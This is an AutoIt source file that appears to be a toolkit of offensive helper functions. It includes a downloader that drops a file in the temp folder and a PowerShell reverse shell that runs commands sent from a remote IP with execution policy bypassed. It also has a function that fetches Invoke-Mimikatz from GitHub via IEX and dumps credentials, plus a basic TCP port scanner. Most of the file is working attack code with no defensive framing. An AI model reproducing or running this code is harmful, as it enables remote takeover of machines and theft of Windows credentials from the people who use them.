#include <Inet.au3>

;download a file from an http server - path: C:\Users\name\AppData\Local\Temp\drop.tmp
Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp")
   InetGet($sURL, $FileName, 1, 1)
EndFunc

;reverse shell using powershell - to be review
Func ReverseShell($RemoteIp, $RemotePort)
   $buffer = "$client = New-Object System.Net.Sockets.TCPClient(" & $RemoteIp & ", $RemotePort);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -c " & " " & $buffer);
EndFunc

;Mimikatz
Func Mimikatz()
   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -exec bypass -C " & " " & $buffer);
EndFunc

;check if internet is up
Func InternetCheck()
    Local $iPing = Ping("wikipedia.org", 250)
    If $iPing Then
        return 1
    Else
        return 0
    EndIf
 EndFunc

;read remote http/s page
Func ReadRemoteVar($url)
   return _INetGetSource($url) & @crlf
EndFunc

;TCP scanner
Func TCPscanner($ip,$port)
   TCPStartup()
   TCPConnect($ip,$port)
   Sleep(1)
   TCPShutdown()
EndFunc
